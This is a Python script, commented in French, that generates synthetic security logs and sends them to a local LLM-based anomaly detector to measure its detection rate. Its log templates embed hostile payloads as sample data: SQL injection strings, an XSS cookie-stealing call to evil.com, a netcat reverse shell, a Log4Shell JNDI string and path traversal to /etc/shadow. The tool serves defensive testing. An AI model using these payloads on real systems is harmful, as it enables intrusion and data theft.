"""
=============================================================
Générateur de Logs Automatique — Plateforme Sécurité IA
=============================================================
Génère 2000 logs 100% aléatoires et variés :
Normal, Brute Force, Port Scan, SQL Injection, DDoS,
RCE, XSS, Path Traversal, Ransomware, Insider Threat...

Usage:
    python generate_logs.py
    python generate_logs.py --count 2000 --delay 0 --no-llm
=============================================================
"""

import random
import time
import json
import argparse
import requests
from datetime import datetime

# =========================
# Configuration
# =========================
API_URL = "http://localhost:5000/api/analyze"
TIMEOUT = 30

# =========================
# IPs aléatoires
# =========================
INTERNAL_IPS = [f"192.168.{random.randint(1,10)}.{random.randint(1,254)}" for _ in range(30)]
EXTERNAL_IPS = [f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(80)]
USERS        = ["root", "admin", "john", "alice", "bob", "ubuntu", "deploy",
                "oracle", "postgres", "mysql", "test", "guest", "www-data", "pi", "ftp"]
PORTS        = [21, 22, 23, 25, 80, 443, 3306, 5432, 8080, 8443, 3389, 6379, 27017,
                random.randint(1024, 65535)]

def rip(internal=False):
    return random.choice(INTERNAL_IPS if internal else EXTERNAL_IPS)

def rport():
    return random.choice(PORTS)

def ruser():
    return random.choice(USERS)

def rn(a=100, b=5000):
    return random.randint(a, b)

def fill(tpl):
    now = datetime.now().strftime("%H:%M:%S")
    return tpl.format(
        ip=rip(random.random() < 0.3),
        tip=rip(internal=True),
        user=ruser(),
        port=rport(),
        time=now,
        n=rn(),
    )

# =========================
# TOUS LES TYPES DE LOGS
# =========================

ALL_LOGS = {

    # ──────────────────────────────────────────
    "Normal": [
        "Accepted password for user {user} from {ip} port {port} ssh2",
        "GET /index.html HTTP/1.1 200 OK from {ip}",
        "GET /api/health HTTP/1.1 200 OK from {ip}",
        "POST /api/login HTTP/1.1 200 OK from {ip}",
        "Session opened for user {user} by (uid=0)",
        "GET /static/main.css HTTP/1.1 200 OK from {ip}",
        "Accepted publickey for {user} from {ip} port {port} ssh2",
        "User {user} authenticated successfully from {ip}",
        "GET /api/metrics HTTP/1.1 200 OK from {ip}",
        "POST /api/data HTTP/1.1 201 Created from {ip}",
        "GET /favicon.ico HTTP/1.1 200 OK from {ip}",
        "pam_unix(sshd:session): session opened for user {user}",
        "GET /api/status HTTP/1.1 304 Not Modified from {ip}",
        "New connection from {ip} port {port} accepted",
        "User {user} logged in from {ip} — session started at {time}",
        "Backup completed successfully at {time}",
        "System health check passed — all services running",
        "Scheduled task completed successfully at {time}",
        "DNS query from {ip} resolved successfully",
        "GET /dashboard HTTP/1.1 200 OK from {ip} — Mozilla/5.0",
    ],

    # ──────────────────────────────────────────
    "Brute Force SSH": [
        "Failed password for invalid user {user} from {ip} port {port} ssh2 [preauth]",
        "Failed password for root from {ip} port {port} ssh2 [preauth]",
        "Invalid user {user} from {ip} port {port}",
        "Maximum authentication attempts exceeded for {user} from {ip} port {port} ssh2",
        "Connection closed by invalid user {user} {ip} port {port} [preauth]",
        "error: PAM: Authentication failure for {user} from {ip}",
        "Failed password for invalid user admin from {ip} port {port} ssh2",
        "PAM service(sshd) ignoring max retries; {n} > 3 from {ip}",
        "Received disconnect from {ip}: Auth fail [preauth]",
        "sshd: {n} failed login attempts from {ip} in 60 seconds",
        "Failed password for nobody from {ip} port {port} ssh2 [preauth]",
        "Disconnecting invalid user {user} {ip}: Too many authentication failures",
        "authentication failure for {user}; rhost={ip}",
        "Failed login attempt #{n} for {user} from {ip}",
        "brute force detected: {ip} tried {n} passwords in 60s",
    ],

    # ──────────────────────────────────────────
    "Port Scan": [
        "Multiple connection attempts detected from {ip} port scan nmap",
        "SYN scan detected from {ip} targeting ports 22,80,443,3306,5432",
        "nmap scan detected: {ip} scanning {tip} ports 1-65535",
        "Port sweep from {ip}: probing {n} ports in 2 seconds",
        "IDS Alert: masscan detected from {ip} — {n} ports/sec",
        "Multiple port probes from {ip}: ports 21,22,23,25,80,110,443",
        "xmas scan from {ip} — FIN+URG+PSH flags detected",
        "fin scan from {ip} — abnormal TCP flags",
        "zmap scan: {ip} probing entire subnet {tip}/24",
        "Snort: PORTSCAN TCP SweepToMany Ports from {ip}",
        "UFW BLOCK: SRC={ip} DST={tip} PROTO=TCP DPT={port} SYN",
        "IDS: {n} unique ports scanned from {ip} in 60s",
        "Firewall: BLOCK SYN packet from {ip} to port {port}",
        "stealth scan detected from {ip} — half-open TCP connections",
        "UDP port scan from {ip} — {n} probes/sec detected",
    ],

    # ──────────────────────────────────────────
    "SQL Injection": [
        "GET /login.php?id=1' OR '1'='1' -- HTTP/1.1 400 from {ip}",
        "POST /search?q=SELECT * FROM users WHERE 1=1; DROP TABLE users;-- from {ip}",
        "GET /product?id=1 UNION SELECT username,password FROM users-- from {ip}",
        "WAF ALERT: SQL Injection detected from {ip}: OR 1=1",
        "GET /api/user?id=1'; exec xp_cmdshell('dir');-- HTTP/1.1 400 from {ip}",
        "ModSecurity: SQL Injection Attack Detected from {ip}",
        "GET /search?q=' OR 1=1 UNION SELECT table_name FROM information_schema.tables-- from {ip}",
        "GET /page?id=1; DROP TABLE logs;-- HTTP/1.1 400 from {ip}",
        "WAF: Blocked SQL injection from {ip}: UNION SELECT NULL,NULL,NULL--",
        "GET /user?name=' WAITFOR DELAY '0:0:5'-- from {ip}",
        "IDS: SQL injection pattern from {ip}: benchmark(10000000,MD5(1))",
        "GET /admin?id=1 INTO OUTFILE '/var/www/shell.php' from {ip}",
        "POST /api/query HTTP/1.1 400 — SQLi detected: 1=1 OR TRUE-- from {ip}",
        "GET /index.php?cat=1 AND SLEEP(5)-- from {ip}",
        "Blind SQL injection attempt from {ip}: id=1 AND (SELECT 1 FROM users LIMIT 1)=1",
    ],

    # ──────────────────────────────────────────
    "DDoS": [
        "{n} requests/sec from {ip}/16 to port 80 - threshold exceeded",
        "SYN flood detected: {n} SYN packets/sec from {ip} to {tip}:80",
        "kernel: possible SYN flooding on port 80. Sending cookies.",
        "rate limit exceeded: {n} requests/sec from {ip} — threshold: 100 req/s",
        "UFW BLOCK: {n} packets from {ip} in last 60s — DDoS suspected",
        "fail2ban: Ban {ip} after {n} requests in 60s (DDoS threshold)",
        "haproxy: server overloaded — {n} concurrent connections from {ip}",
        "HTTP flood: {n} POST requests/sec from {ip} to /api/login",
        "bandwidth exceeded: {ip} consumed {n}MB/s — DDoS mitigation activated",
        "DDoS protection triggered: {n} req/s from {ip} blocked",
        "Flood attack: {n} UDP packets/sec from {ip} to port 53",
        "iptables: BLOCK {ip} — {n} connections in 10s exceeds limit",
        "nginx: limiting requests, excess: {n} by zone api, client: {ip}",
        "amplification attack detected: {ip} sending {n} DNS queries/sec",
        "slowloris attack suspected from {ip} — {n} half-open connections",
    ],

    # ──────────────────────────────────────────
    "XSS": [
        "WAF: XSS attempt blocked from {ip}: <script>alert('xss')</script>",
        "POST /comment HTTP/1.1 400 — XSS detected: <img src=x onerror=alert(1)> from {ip}",
        "GET /search?q=<script>document.cookie</script> from {ip}",
        "ModSecurity: Cross-Site Scripting attack from {ip}",
        "XSS payload detected from {ip}: javascript:alert(document.domain)",
        "WAF blocked stored XSS attempt from {ip} on /api/profile",
        "GET /page?name=<svg onload=fetch('http://evil.com/'+document.cookie)> from {ip}",
        "IDS: DOM-based XSS attempt from {ip} targeting /login",
    ],

    # ──────────────────────────────────────────
    "Path Traversal": [
        "GET /download?file=../../etc/passwd HTTP/1.1 403 from {ip}",
        "WAF: Path traversal blocked from {ip}: ../../../etc/shadow",
        "GET /api/read?path=....//....//etc/passwd from {ip}",
        "ModSecurity: Directory traversal attempt from {ip}",
        "GET /static/../../../etc/hosts HTTP/1.1 400 from {ip}",
        "IDS: File inclusion attempt from {ip}: /proc/self/environ",
    ],

    # ──────────────────────────────────────────
    "RCE": [
        "WAF: Remote code execution attempt from {ip}: ;cat /etc/passwd",
        "GET /api/exec?cmd=whoami HTTP/1.1 400 from {ip}",
        "ModSecurity: Command injection detected from {ip}: $(id)",
        "POST /upload HTTP/1.1 403 — PHP webshell upload blocked from {ip}",
        "IDS: Shell injection attempt from {ip}: | nc -e /bin/sh {ip} 4444",
        "GET /cgi-bin/test.cgi?cmd=;ls -la from {ip}",
        "Log4Shell exploit attempt from {ip}: ${{jndi:ldap://{ip}/exploit}}",
    ],

    # ──────────────────────────────────────────
    "Ransomware": [
        "ALERT: Mass file encryption detected on host {tip} — ransomware suspected",
        "Unusual file write activity: {n} files encrypted in 60s on {tip}",
        "Endpoint protection: .locked extension detected on {n} files — {tip}",
        "CRITICAL: Shadow copies deleted on {tip} — possible ransomware",
        "Suspicious process: vssadmin.exe delete shadows on {tip}",
        "File integrity alert: {n} critical files modified in 30s on {tip}",
    ],

    # ──────────────────────────────────────────
    "Insider Threat": [
        "ALERT: User {user} accessed {n} sensitive files outside working hours from {ip}",
        "Unusual data transfer: {user} exported {n}MB to external IP {ip}",
        "Policy violation: {user} attempted to access restricted DB from {ip}",
        "DLP Alert: {user} sent confidential document to {ip} via email",
        "SIEM: {user} logged in from unusual location {ip} at {time}",
        "Privilege escalation attempt by {user} from {ip}",
    ],

    # ──────────────────────────────────────────
    "Malware": [
        "Antivirus: Trojan.GenericKD detected on host {tip} — quarantined",
        "IDS: C2 communication detected from {tip} to {ip}:4444",
        "Endpoint: Suspicious PowerShell execution on {tip} — obfuscated script",
        "SIEM: Beaconing activity from {tip} to {ip} every 60s",
        "Firewall: Blocked outbound connection to known malware C2 {ip}:443",
        "EDR: Mimikatz-like credential dumping detected on {tip}",
        "IDS: Reverse shell attempt from {tip} to {ip} port {port}",
    ],
}

# =========================
# Génération aléatoire pure
# =========================

ALL_CATEGORIES = list(ALL_LOGS.keys())

def generate_random_log():
    """Choisit une catégorie AU HASARD (équiprobable) et génère un log aléatoire."""
    category = random.choice(ALL_CATEGORIES)
    template = random.choice(ALL_LOGS[category])
    return category, fill(template)

# =========================
# Envoi à l'API
# =========================

def send_log(log_text: str, no_llm: bool = False) -> dict | None:
    try:
        payload = {"log": log_text}
        if no_llm:
            payload["no_llm"] = True
        response = requests.post(API_URL, json=payload, timeout=TIMEOUT)
        if response.status_code == 200:
            return response.json().get("result", {})
        return None
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError:
        print("❌ Flask introuvable sur le port 5000. Lance d'abord : python app.py")
        exit(1)

# =========================
# Main
# =========================

def run(total: int, delay: float, verbose: bool, no_llm: bool):
    mode = "⚡ RAPIDE (sans LLM)" if no_llm else "🤖 PRÉCIS (avec LLM Phi3)"
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║        Générateur de Logs — Plateforme Sécurité IA           ║
╠══════════════════════════════════════════════════════════════╣
║  Total logs    : {total}                                      
║  Distribution  : 100% ALÉATOIRE ({len(ALL_CATEGORIES)} types de logs)
║  Types         : Normal, SSH BruteForce, PortScan, SQLi, DDoS,
║                  XSS, RCE, PathTraversal, Ransomware,
║                  InsiderThreat, Malware
║  Mode          : {mode}
╚══════════════════════════════════════════════════════════════╝
    """)

    stats = {
        "total": 0, "success": 0, "failed": 0,
        "anomalies": 0, "normal": 0,
        "by_category": {cat: 0 for cat in ALL_CATEGORIES},
        "by_detected_by": {"rules": 0, "llm": 0, "fallback": 0, "rules_fast": 0},
        "confidence_sum": 0.0,
    }

    start_time = time.time()

    for i in range(1, total + 1):
        category, log_text = generate_random_log()
        stats["by_category"][category] += 1

        result = send_log(log_text, no_llm=no_llm)

        if result is None:
            stats["failed"] += 1
        else:
            stats["success"] += 1
            if result.get("is_anomaly"):
                stats["anomalies"] += 1
            else:
                stats["normal"] += 1

            detected_by = result.get("detected_by", "unknown")
            if detected_by in stats["by_detected_by"]:
                stats["by_detected_by"][detected_by] += 1

            stats["confidence_sum"] += result.get("confidence", 0)

        stats["total"] += 1

        # Affichage progression tous les 50 logs
        if verbose or i % 50 == 0:
            elapsed = time.time() - start_time
            rate = i / elapsed if elapsed > 0 else 0
            eta  = (total - i) / rate if rate > 0 else 0
            dr   = (stats["anomalies"] / stats["success"] * 100) if stats["success"] > 0 else 0
            icon = "🚨" if result and result.get("is_anomaly") else "✅"
            print(f"[{i:4}/{total}] {icon} {category:<20} | Détection: {dr:.1f}% | ETA: {eta:.0f}s")

        if delay > 0:
            time.sleep(delay)

    # ─── Rapport final ───
    elapsed_total  = time.time() - start_time
    avg_confidence = (stats["confidence_sum"] / stats["success"] * 100) if stats["success"] > 0 else 0
    detection_rate = (stats["anomalies"] / stats["success"] * 100) if stats["success"] > 0 else 0

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    📊 RAPPORT FINAL KPIs                     ║
╠══════════════════════════════════════════════════════════════╣
║  Logs envoyés       : {stats['total']}
║  Anomalies          : {stats['anomalies']}
║  Normal             : {stats['normal']}
║  Taux de détection  : {detection_rate:.1f}%
║  Confiance moyenne  : {avg_confidence:.1f}%
║  Temps total        : {elapsed_total:.1f}s
║  Vitesse            : {stats['total']/elapsed_total:.1f} logs/s
╠══════════════════════════════════════════════════════════════╣
║  Par méthode :
║    Règles rapides   : {stats['by_detected_by']['rules']}
║    LLM Phi3         : {stats['by_detected_by']['llm']}
║    Fallback         : {stats['by_detected_by']['fallback']}
╠══════════════════════════════════════════════════════════════╣
║  Distribution réelle des logs générés :""")
    for cat, count in sorted(stats["by_category"].items(), key=lambda x: -x[1]):
        pct = count / stats["total"] * 100
        print(f"║    {cat:<22}: {count:>4} ({pct:.1f}%)")
    print("╚══════════════════════════════════════════════════════════╝")

    # Sauvegarde JSON
    report = {
        "date": datetime.now().isoformat(),
        "total_logs": stats["total"],
        "anomalies": stats["anomalies"],
        "normal": stats["normal"],
        "detection_rate_percent": round(detection_rate, 2),
        "avg_confidence_percent": round(avg_confidence, 2),
        "elapsed_seconds": round(elapsed_total, 2),
        "logs_per_second": round(stats["total"] / elapsed_total, 2),
        "by_category": stats["by_category"],
        "by_detected_by": stats["by_detected_by"],
    }
    report_file = f"rapport_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print(f"\n📄 Rapport JSON sauvegardé : {report_file}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Générateur de logs aléatoires")
    parser.add_argument("--count",   type=int,   default=2000,  help="Nombre de logs (défaut: 2000)")
    parser.add_argument("--delay",   type=float, default=0,     help="Délai entre logs en secondes (défaut: 0)")
    parser.add_argument("--verbose", action="store_true",       help="Afficher chaque log")
    parser.add_argument("--no-llm",  action="store_true",       help="Mode rapide — désactiver le LLM Phi3")
    args = parser.parse_args()

    run(total=args.count, delay=args.delay, verbose=args.verbose, no_llm=args.no_llm)
